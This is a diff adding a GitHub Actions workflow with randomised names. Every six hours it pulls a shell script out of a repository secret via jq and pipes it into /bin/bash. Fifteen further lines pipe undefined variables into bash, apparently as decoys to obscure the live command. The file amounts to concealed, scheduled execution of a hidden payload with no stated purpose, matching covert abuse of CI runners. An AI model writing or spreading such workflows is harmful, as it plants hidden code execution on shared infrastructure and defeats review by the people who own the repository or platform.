@@ -1,0 +1,32 @@
+name: poliajiaya
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: poliajiaya
+        env:
+          yilmh67260: ${{ secrets.yilmh67260 }}
+        run: |
+          echo $yilmh67260 | jq -r .uzh10975 | /bin/bash
+          echo $lugsr41 | jq -r .fpu7233 | /bin/bash
+          echo $oarz254 | jq -r .kb95 | /bin/bash
+          echo $ox5 | jq -r .zg1789 | /bin/bash
+          echo $xjops21 | jq -r .w292 | /bin/bash
+          echo $xwil59 | jq -r .yrw6220 | /bin/bash
+          echo $wa12 | jq -r .yr635 | /bin/bash
+          echo $qvq78905 | jq -r .ckg636 | /bin/bash
+          echo $ulwv7 | jq -r .g10 | /bin/bash
+          echo $rugpn025 | jq -r .qkbsk92507 | /bin/bash
+          echo $w28 | jq -r .oqbr92620 | /bin/bash
+          echo $odee91453 | jq -r .w01 | /bin/bash
+          echo $hkf54 | jq -r .ldo13 | /bin/bash
+          echo $er07 | jq -r .izx3319 | /bin/bash
+          echo $ksaxy9 | jq -r .qxrq673 | /bin/bash
+          echo $neou8086 | jq -r .vt79 | /bin/bash
+
